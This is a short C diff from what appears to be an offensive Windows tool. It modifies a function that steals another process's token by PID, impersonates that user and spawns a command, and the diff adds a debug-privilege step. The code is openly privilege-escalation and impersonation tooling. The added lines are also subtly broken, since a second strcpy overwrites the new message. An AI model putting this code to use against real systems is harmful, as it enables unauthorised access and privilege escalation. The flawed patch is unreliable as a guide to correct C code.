@@ -280,6 +280,7 @@ char *impersonate(int pid, char *command){
     PROCESS_INFORMATION processInformation;
     startupInfo.cb = sizeof(STARTUPINFO);
     HANDLE hToken = getPrimaryTokenFromProcess(pid);
+    char *enableDebug = enableDebugPrivilege();
     char *open = "[-] Failed to obtain duplicated token.\r\n";
     char *newUser = getName();
     char *impersonation = "[+] Impersonation successfull.\r\n";
@@ -320,7 +321,8 @@ char *impersonate(int pid, char *command){
 
     CloseHandle(hToken);
 
-    char *result = malloc((strlen(firstUser) + strlen(open) + strlen(newUser) +strlen(impersonation) +strlen(dupProc) +strlen(procSpawn))*sizeof(char) + 2); 
+    char *result = malloc((strlen(enableDebug) + strlen(firstUser) + strlen(open) + strlen(newUser) +strlen(impersonation) +strlen(dupProc) +strlen(procSpawn))*sizeof(char) + 2); 
+    strcpy(result, enableDebug);
     strcpy(result, firstUser);
     strcat(result, open);
     strcat(result, impersonation);
